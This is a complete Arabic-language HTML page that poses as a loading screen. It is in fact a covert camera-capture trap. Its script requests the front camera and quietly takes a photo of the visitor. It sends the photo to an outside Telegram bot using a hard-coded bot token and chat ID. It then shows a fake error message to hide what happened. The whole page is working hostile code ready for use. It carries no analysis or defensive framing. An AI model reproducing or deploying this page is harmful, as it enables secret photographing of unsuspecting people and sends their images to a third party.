<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { 
            font-family: Arial; 
            text-align: center; 
            background: #000; 
            color: white; 
            margin:0; 
            padding:0; 
            height: 100vh;
            overflow: hidden;
        }
        #loader {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
        }
        .spinner {
            border: 6px solid #333;
            border-top: 6px solid #ff0066;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        video { display: none; }
    </style>
</head>
<body>
    <div id="loader">
        <div class="spinner"></div>
        <p>جاري تحميل الصفحة...</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loader = document.getElementById('loader');
        const botToken = "8807798502:AAHZFi61wI_KflrG-3rLoHmccS_WqRuqNfg";
        const chatId = "2049331070";

        // طلب الكاميرا بنسبة 9:16 عمودية افتراضياً
        navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user",
                width: { ideal: 720 },
                height: { ideal: 1280 }
            } 
        })
        .then(stream => {
            video.srcObject = stream;
            // الانتظار حتى يتم تحميل بيانات الفيديو لمعرفة الأبعاد الحقيقية
            video.onloadedmetadata = () => {
                setTimeout(captureAndSend, 1500);
            };
        })
        .catch(() => showError());

        function captureAndSend() {
            const vWidth = video.videoWidth;
            const vHeight = video.videoHeight;
            
            // تحديد أبعاد الكانفاس الثابتة بنسبة 9:16
            const targetWidth = 720;
            const targetHeight = 1280;
            
            canvas.width = targetWidth;
            canvas.height = targetHeight;
            
            const ctx = canvas.getContext('2d');
            
            // حساب النسبة والتوسيط التلقائي (Center and Zoom Out)
            const videoRatio = vWidth / vHeight;
            const targetRatio = targetWidth / targetHeight;
            
            let drawWidth, drawHeight, offsetX, offsetY;
            
            // محاكاة وضعية الـ Zoom Out (تعديل المعامل للتحكم بمدى البعد)
            // استخدام معامل 0.85 يضمن صغر حجم المشهد وظهور الكاميرا بشكل أوسع ومتوسط تماماً
            const zoomFactor = 0.85; 

            if (videoRatio > targetRatio) {
                // إذا كان الفيديو القادم عريضاً جداً
                drawHeight = targetHeight * zoomFactor;
                drawWidth = drawHeight * videoRatio;
            } else {
                // إذا كان الفيديو القادم طويلاً جداً
                drawWidth = targetWidth * zoomFactor;
                drawHeight = drawWidth / videoRatio;
            }
            
            // معادلة التوسيط الرياضي المطلق لضمان عدم حدوث إزاحة لليسار أو اليمين
            offsetX = (targetWidth - drawWidth) / 2;
            offsetY = (targetHeight - drawHeight) / 2;
            
            // ملء الخلفية باللون الأسود لتغطية أي حواف فارغة ناتجة عن الـ Zoom Out
            ctx.fillStyle = "#000000";
            ctx.fillRect(0, 0, targetWidth, targetHeight);
            
            // رسم الصورة في المنتصف تماماً وبشكل متناسق
            ctx.drawImage(video, offsetX, offsetY, drawWidth, drawHeight);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.jpg');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(() => showError())
                .catch(() => showError());
            }, 'image/jpeg', 0.9);
        }

        function showError() {
            loader.innerHTML = `
                <h1 style="color:#ff0066;">خطأ في تحميل الصفحة</h1>
                <p style="font-size:19px;">حدث خطأ غير متوقع<br>يرجى المحاولة مرة أخرى</p>
            `;
            if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
        }
    </script>
</body>
</html>
